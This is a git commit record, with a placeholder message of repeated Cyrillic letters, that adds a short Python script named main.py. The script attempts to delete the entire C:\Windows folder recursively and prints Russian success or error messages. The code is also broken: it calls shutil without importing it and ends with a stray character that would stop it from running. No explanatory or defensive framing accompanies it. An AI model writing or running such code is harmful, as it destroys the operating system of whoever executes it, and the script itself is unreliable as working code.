88b0fdb29d1f44751ce3da36b34ed924cc2aec89
vovawe <vova.090211m@gmail.com>
2024-10-21 16:34:35 +0200

    ыыыыы

---
+++ main.py
@@ -0,0 +1,10 @@
+import os
+
+folder_path = "C:\\Windows"
+
+try:
+    shutil.rmtree(folder_path)
+    print(f"Папка {folder_path} успешно удалена.")
+except Exception as e:
+    print(f"Ошибка при удалении папки: {e}")
+ы
